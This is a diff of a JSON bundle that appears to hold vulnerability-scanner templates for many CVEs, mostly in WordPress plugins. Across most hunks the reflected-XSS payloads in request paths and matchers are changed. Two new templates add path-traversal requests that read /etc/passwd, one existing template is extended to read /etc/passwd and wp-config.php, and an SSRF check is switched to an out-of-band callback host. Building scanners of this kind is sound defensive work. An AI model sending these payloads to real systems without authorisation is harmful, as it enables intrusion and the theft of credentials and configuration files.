@@ -408,7 +408,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -428,7 +428,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/advanced-text-widget/advancedtext.php?page=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/advanced-text-widget/advancedtext.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -450,7 +450,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -470,7 +470,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/flash-album-gallery/facebook.php?i=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -492,7 +492,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -512,7 +512,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/adminimize/adminimize_page.php?page=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/adminimize/adminimize_page.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -534,7 +534,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -554,7 +554,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -576,7 +576,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -596,7 +596,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?name=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -618,7 +618,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -638,7 +638,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/skysa-official/skysa.php?submit=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/skysa-official/skysa.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -660,7 +660,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -680,7 +680,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?cdwidgetid=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -702,7 +702,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -722,7 +722,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/featurific-for-wordpress/cached_image.php?snum=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/featurific-for-wordpress/cached_image.php?snum=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -778,7 +778,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -798,7 +798,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -820,7 +820,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -840,7 +840,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3Ealert%28123%29;%3C/script%3E"
+            "{{BaseURL}}/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -862,7 +862,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img/src=x onerror=alert(123)>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -882,7 +882,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?page_id=1&pagination_wp_facethumb=1%22%3E%3Cimg%2Fsrc%3Dx%20onerror%3Dalert%28123%29%3E"
+            "{{BaseURL}}/?page_id=1&pagination_wp_facethumb=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -966,7 +966,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -986,7 +986,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?page_id=2&%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/?page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1008,7 +1008,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1028,7 +1028,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E"
+            "{{BaseURL}}/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1050,7 +1050,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1070,7 +1070,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?dlsearch=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1092,7 +1092,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<ScrIpT>alert(123)</ScrIpT>"
+                "</sCripT><sCripT>alert(document.domain)</sCripT>"
               ]
             },
             {
@@ -1112,7 +1112,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-login.php?redirect_to=http%3A%2F%2F%3F1%3CScrIpT%3Ealert%28123%29%3C%2FScrIpT%3E"
+            "{{BaseURL}}/wp-login.php?redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E"
           ]
         }
       ]
@@ -1244,7 +1244,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1264,7 +1264,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/uploader/views/notify.php?notify=unnotif&blog=%3Cscript%3Ealert%28123%29;%3C/script%3E"
+            "{{BaseURL}}/wp-content/plugins/uploader/views/notify.php?notify=unnotif&blog=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1373,7 +1373,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1393,7 +1393,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?ID=1%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/category-grid-view-gallery/includes/CatGridPost.php?ID=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1415,7 +1415,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1435,7 +1435,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/duplicator/files/installer.cleanup.php?remove=1&package=%3Cscript%3Ealert%28123%29;%3C/script%3E"
+            "{{BaseURL}}/wp-content/plugins/duplicator/files/installer.cleanup.php?remove=1&package=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -1686,7 +1686,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</textarea></script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -1706,7 +1706,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%22%3E%3C/textarea%3E%3Cscript%3Ealert%28123%29%3C/script%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
+            "{{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
           ]
         }
       ]
@@ -2283,7 +2283,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2303,7 +2303,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/anti-plagiarism/js.php?m=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/anti-plagiarism/js.php?m=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2325,7 +2325,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2345,7 +2345,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/defa-online-image-protector/redirect.php?r=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/defa-online-image-protector/redirect.php?r=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2367,7 +2367,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2387,7 +2387,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/date_select.php?date-from=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/date_select.php?date-from=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2408,7 +2408,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2428,7 +2428,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/title_az.php?title_az=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/e-search/tmpl/title_az.php?title_az=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2450,7 +2450,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2470,7 +2470,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&msg=imported"
+            "{{BaseURL}}/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&msg=imported"
           ]
         }
       ]
@@ -2492,7 +2492,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2512,7 +2512,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%22%20%3C%2Fscript%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C"
+            "{{BaseURL}}/wp-content/plugins/forget-about-shortcode-buttons/assets/js/fasc-buttons/popup.php?source=1&ver=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2534,7 +2534,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2554,7 +2554,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/hdw-tube/playlist.php?playlist=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/hdw-tube/playlist.php?playlist=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2576,7 +2576,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123);</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -2596,7 +2596,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E%3C%22"
+            "{{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -2652,7 +2652,7 @@
     {
       "id": "CVE-2016-10956",
       "info": {
-        "author": "daffainfo",
+        "author": "daffainfo,0x240x23elu",
         "description": "The mail-masta plugin 1.0 for WordPress has local file inclusion in count_of_send.php and csvexport.php.",
         "name": "Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)",
         "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956",
@@ -3599,7 +3599,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -3619,7 +3619,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php?post=%22%2F%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php?post=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -3642,7 +3642,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -3662,7 +3662,7 @@
           "matchers-condition": "and",
           "method": "POST",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E=1"
+            "{{BaseURL}}/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E=1"
           ]
         }
       ]
@@ -3684,7 +3684,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -3831,7 +3831,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img src=x onerror=javascript:prompt(123)>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -3851,7 +3851,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?author=1%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aprompt%28123%29%3E"
+            "{{BaseURL}}/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -4303,7 +4303,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img src=x onerror=alert(123)>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -4323,7 +4323,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3E"
+            "{{BaseURL}}/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -4799,7 +4799,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -4819,7 +4819,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php/community/?%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -5356,9 +5356,71 @@
       ]
     },
     {
+      "id": "CVE-2018-16059",
+      "info": {
+        "author": "daffainfo",
+        "name": "WirelessHART Fieldgate SWG70 3.0 - Directory Traversal",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2018-16059\n- https://www.exploit-db.com/exploits/45342\n",
+        "severity": "medium",
+        "tags": "cve,cve2018,iot,lfi"
+      },
+      "requests": [
+        {
+          "body": "action=ajax&command=4&filename=../../../../../../../../../../etc/passwd&origin=cw.Communication.File.Read&transaction=fileCommand",
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/fcgi-bin/wgsetcgi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-16283",
+      "info": {
+        "author": "0x240x23elu",
+        "name": "WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2018-16283\n- https://www.exploit-db.com/exploits/45438\n",
+        "severity": "critical",
+        "tags": "cve,cve2018,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-16299",
       "info": {
-        "author": "0x_Akoko",
+        "author": "0x_Akoko,0x240x23elu",
         "name": "WordPress Plugin Localize My Post 1.0 - LFI",
         "reference": "https://www.exploit-db.com/exploits/45439",
         "severity": "high",
@@ -5923,7 +5985,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -5943,7 +6005,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8"
+            "{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8"
           ]
         }
       ]
@@ -6337,7 +6399,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -6357,7 +6419,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+            "{{BaseURL}}/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -6430,7 +6492,7 @@
     {
       "id": "CVE-2018-7422",
       "info": {
-        "author": "LuskaBol",
+        "author": "LuskaBol,0x240x23elu",
         "description": "A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.",
         "name": "WordPress Site Editor Plugin LFI",
         "reference": "https://www.exploit-db.com/exploits/44340",
@@ -6450,16 +6512,18 @@
               ]
             },
             {
-              "status": [
-                200
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
               ],
-              "type": "status"
+              "type": "regex"
             }
           ],
-          "matchers-condition": "and",
+          "matchers-condition": "or",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php"
+            "{{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php",
+            "{{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
           ]
         }
       ]
@@ -7733,7 +7797,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<svg/onload=confirm(123)>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -7753,7 +7817,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?rsd=%27%3E%3Csvg%2Fonload%3Dconfirm%28123%29%3E"
+            "{{BaseURL}}/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -7978,7 +8042,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -7998,7 +8062,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=%3Cscript%3Ealert%28123%29%3C/script%3E"
+            "{{BaseURL}}/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -8020,7 +8084,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<script>alert(123)</script>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -8040,7 +8104,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%3C%2Fpath%3E"
+            "{{BaseURL}}/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -8414,21 +8478,22 @@
         "name": "Openfire Full Read SSRF",
         "refrense": "- https://swarm.ptsecurity.com/openfire-admin-console/\n- https://github.com/igniterealtime/Openfire/pull/1497\n",
         "severity": "critical",
-        "tags": "cve,cve2019,ssrf"
+        "tags": "cve,cve2019,ssrf,openfire,oob"
       },
       "requests": [
         {
           "matchers": [
             {
+              "part": "interactsh_protocol",
               "type": "word",
               "words": [
-                "<h1>Burp Collaborator Server</h1>"
+                "http"
               ]
             }
           ],
           "method": "GET",
           "path": [
-            "{{BaseURL}}/getFavicon?host=burpcollaborator.net"
+            "{{BaseURL}}/getFavicon?host=http://{{interactsh-url}}"
           ]
         }
       ]
@@ -8450,7 +8515,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "foo\"><svg//onload=\"alert(123)\">"
+                "foo\"></script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -8470,7 +8535,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3E%3Csvg//onload=%22alert(123)%22%3E"
+            "{{BaseURL}}/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -11410,7 +11475,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<img src onerror=alert(123)>"
+                "</script><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -11437,7 +11502,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?s=%3Cimg%20src%20onerror=alert(123)%3E"
+            "{{BaseURL}}/?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -12851,6 +12916,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/api/settings/values"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-28188",
+      "info": {
+        "author": "gy741",
+        "description": "Remote Command Execution (RCE) vulnerability in TerraMaster TOS <= 4.2.06 allow remote unauthenticated attackers to inject OS commands via /include/makecvs.php in Event parameter.",
+        "name": "TerraMaster TOS - Unauthenticated Remote Command Execution",
